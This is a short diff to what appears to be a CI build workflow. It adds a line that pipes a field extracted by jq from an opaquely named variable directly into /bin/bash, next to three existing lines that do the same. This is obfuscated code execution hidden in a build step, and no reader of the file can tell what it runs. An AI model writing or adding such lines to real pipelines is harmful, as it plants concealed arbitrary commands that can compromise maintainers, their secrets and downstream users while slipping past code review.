@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$drc38" | jq -r .ozjlg4589 | /bin/bash
           echo $ymc2118 | jq -r .hqa6972 | /bin/bash
           echo $tdcsw67088 | jq -r .uf284 | /bin/bash
+          echo $pxmf85 | jq -r .tkzq40709 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
